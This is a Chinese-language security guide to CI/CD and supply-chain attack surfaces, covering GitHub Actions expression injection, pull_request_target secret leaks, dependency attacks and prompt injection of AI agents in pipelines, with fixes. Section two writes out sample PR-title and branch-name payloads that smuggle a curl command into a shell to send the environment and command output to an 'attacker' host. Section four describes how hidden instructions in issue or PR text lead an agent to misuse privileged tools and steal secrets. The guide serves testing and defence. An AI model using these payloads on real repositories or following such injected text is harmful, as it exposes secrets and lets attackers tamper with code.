# CI/CD 与软件供应链攻击面

> CI/CD 是"信任集中点"：它能拿到源码、凭据、制品仓库与生产部署权限。2025 年的新趋势是用 **AI Agent + 不可信文本** 做提示注入，从而在流水线中执行特权命令。

## 一、攻击面清单

| 面 | 典型问题 |
|---|---|
| 触发器 | `pull_request_target`、`workflow_run`、`issue_comment` 触发高权工作流 |
| 输入 | PR 标题/分支名/commit message/issue 内容被拼进 shell（命令注入） |
| Secrets | 可被 PR 代码读取（`pull_request_target` + checkout PR 代码） |
| Artifacts | 上游构建产物可被替换（无签名/无摘要校验） |
| 依赖 | 依赖混淆、typosquatting、`postinstall` 脚本、lockfile 篡改 |
| Runner | 自托管 Runner 可持久化（后续任务被污染）、容器逃逸 |
| 权限 | `GITHUB_TOKEN` 权限过大（`contents: write`、`actions: write`、OIDC 到云） |
| AI Agent | 把 issue/PR 文本提示注入到 Agent → 特权工具执行（见下文） |

## 二、注入点（常见且高命中）

```yaml
# 危险：表达式直接进入 shell
run: echo "${{ github.event.pull_request.title }}"
run: git checkout ${{ github.head_ref }}
```

变量注入绕过：

```text
标题：  a"; curl http://attacker/$(id|base64) #
分支名：main"; env | curl -d @- http://attacker #
```

还有：`${{ github.event.issue.body }}`、`github.event.comment.body`、`github.event.pull_request.body`、`github.event.review.body`、`github.event.pages.*.page_name`、`github.event.commits.*.message`、`github.event.head_commit.message`。

防护要点（也是测试要点）：这些值应通过 `env:` 传递而非插值进 `run:`。

## 三、`pull_request_target` 经典链

```text
PR（来自 fork，未受信）→ 触发 pull_request_target
  → 工作流 checkout PR 的代码（或运行 PR 中的脚本）
  → 工作流持有 secrets → secret 泄漏 / 仓库写权限被滥用
```

变体：`workflow_run` 后接高权任务、`issue_comment` 触发 + 仓库内脚本被 PR 修改。

## 四、AI Agent 在 CI 中的提示注入（2025 新）

- 攻击者把指令藏在 issue/PR/commit 文本中，Agent 读取后执行特权工具（`actions: write`、部署、发版）。
- 攻击链：不可信文本 → Agent 上下文 → 调用有权工具 → 窃取 secret / 篡改仓库（Aikido "PromptPwned" 2025）。
- 防御：Agent 工具最小权限、不可信内容不进入同一上下文、敏感操作要求人工确认（见 `../AI-Agent-Security/README.md`）。

## 五、产物与依赖可信

- 构建产物必须有签名/摘要（`cosign`、provenance、SLSA）。
- 校验下载的文件摘要；不要 `curl | sh`。
- 锁定依赖版本与哈希（lockfile 提交并校验）；私有包优先于公共源（防依赖混淆）。
- 构建与发布使用不同身份，发布需人工批准。

## 六、验证（最小证据）

1. 触发路径：从"外部可控输入"到"特权执行"的完整链（给出 PR/issue/分支名内容与工作流文件）。
2. 影响证据：带外命中、读取到的 secret 名（值掩码）、或被写入的仓库对象。
3. 说明前置条件（是否需要 fork、是否需要维护者审批）。
4. **不要**在真实客户仓库中执行破坏性操作（删除分支/发布包）。

## 七、常见误报

- 工作流存在插值但**该值被 GitHub 转义**（视使用位置而定，需实测）。
- 触发条件需要维护者手动 approve（风险降低但不为零）。
- 只有 `read` 权限的 `GITHUB_TOKEN` 限制了影响。

## 八、修复（要点）

- 用 `env:` 传值，禁止把 `github.event.*` 直接插值进 `run:`。
- `pull_request_target` 禁止 checkout PR 代码；需要时使用无 secret 的独立工作流。
- `permissions:` 默认最小（`contents: read`）；OIDC 到云时限制 subject/aud 条件。
- 自托管 Runner 用后即弃（ephemeral）、隔离网络、不持久化凭据。
- 依赖：私源优先 + 版本锁定 + 产物签名 + provenance 校验。
- AI Agent：工具白名单 + 人工确认 + 不可信内容隔离。

## 参考

- Aikido：Prompt Injection Inside GitHub Actions（2025）
- GitHub Actions 安全加固文档、SLSA、Sigstore/cosign
- OWASP Top 10 CI/CD Security Risks（CICD-SEC）
